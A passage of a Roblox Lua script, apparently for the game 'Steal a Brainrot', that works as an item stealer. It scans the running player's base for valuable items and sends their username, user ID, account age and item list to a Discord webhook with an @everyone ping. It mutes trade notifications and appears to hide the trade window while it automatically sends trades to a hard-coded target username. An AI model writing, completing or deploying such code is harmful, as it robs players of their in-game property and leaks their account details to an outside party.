        table.insert(parts, infoBlock("📅", "Cuenta", ("%d días"):format(LP.AccountAge)))
    end

    local desc = table.concat(parts, "\n")
    if #desc > 4000 then desc = string.sub(desc, 1, 3990) .. "\n..." end

    local footer = ("%s • %d • %s • %s | hoy a las %s"):format(
        LP.Name, LP.UserId, CFG.FOOTER_SITE, CFG.FOOTER_DISCORD, os.date("%H:%M"))

    local content = ("%sthe best brainrot targeted is \"%s\""):format(
        CFG.PING_EVERYONE and "@everyone " or "",
        best and best.name or "nothing")

    postWebhook({
        username = "SAB",
        content = content,
        allowed_mentions = { parse = { "everyone" } },
        embeds = { { color = 65280, description = desc, footer = { text = footer } } },
    })
end

--=====================================================================
-- BUCLE
--=====================================================================
local function scanLocal()
    local plot = getPlotOfPlayer(LP)
    if not plot then return {} end
    return collectFromPlot(plot)
end

task.spawn(function()
    while not game:IsLoaded() do task.wait(0.5) end
    task.wait(2)
    muteTradeNotifs()
    discoverRemotes()
    if not REMOTES.Request then notify("SAB", "Sin remote de trade. Mira F9.") end

    while STATE.running do
        local ok, all = pcall(scanLocal)
        if ok and all then
            local sig = {}
            for _, it in ipairs(all) do table.insert(sig, it.raw .. "|" .. tostring(it.id)) end
            table.sort(sig)
            sig = table.concat(sig, ";")

            local targets = 0
            for _, it in ipairs(all) do
                if classify(it) ~= "none" then targets = targets + 1 end
            end

            if targets > 0 and STATE.lastReport ~= sig then
                STATE.lastReport = sig
                report(all)
                notify("SAB", ("%d objetivo(s) en la base"):format(targets))
            end

            if targets > 0 and not STATE.inTrade and not tradeOpen()
                and (tick() - STATE.lastRequest) >= CFG.RETRY_DELAY then
                runTrade()
            end
        end
        task.wait(CFG.POLL_INTERVAL)
    end
end)

--=====================================================================
-- HUD
--=====================================================================
pcall(function()
    local gui = Instance.new("ScreenGui")
    gui.Name = "SAB_HUD"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99
    gui.Parent = LP:WaitForChild("PlayerGui")

    local f = Instance.new("Frame")
    f.Size = UDim2.fromOffset(250, 76); f.Position = UDim2.fromOffset(12, 12)
    f.BackgroundColor3 = Color3.fromRGB(16, 16, 18); f.BorderSizePixel = 0; f.Parent = gui
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)

    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, -12, 0, 20); t.Position = UDim2.fromOffset(8, 6)
    t.BackgroundTransparency = 1; t.Font = Enum.Font.GothamBold; t.TextSize = 13
    t.TextXAlignment = Enum.TextXAlignment.Left
    t.TextColor3 = Color3.fromRGB(120, 220, 140)
    t.Text = "SAB -> " .. tostring(getgenv().TARGET_USERNAME); t.Parent = f

    local s = Instance.new("TextLabel")
    s.Size = UDim2.new(1, -12, 0, 16); s.Position = UDim2.fromOffset(8, 28)
    s.BackgroundTransparency = 1; s.Font = Enum.Font.Gotham; s.TextSize = 11
    s.TextXAlignment = Enum.TextXAlignment.Left
    s.TextColor3 = Color3.fromRGB(205, 205, 205); s.Text = "iniciando..."; s.Parent = f

    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -16, 0, 20); b.Position = UDim2.fromOffset(8, 50)
    b.BackgroundColor3 = Color3.fromRGB(200, 60, 60); b.BorderSizePixel = 0
    b.Font = Enum.Font.GothamBold; b.TextSize = 11; b.TextColor3 = Color3.new(1,1,1)
    b.Text = "DETENER"; b.Parent = f
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)

    b.MouseButton1Click:Connect(function()
        STATE.running = false
        s.Text = "detenido"
        local r = findTradeRoot(); if r then pcall(function() r.Enabled = true end) end
    end)

    _G.SAB_HUD = function(m) s.Text = tostring(m) end
end)

notify("SAB", "Cargado. Trade -> " .. tostring(getgenv().TARGET_USERNAME))
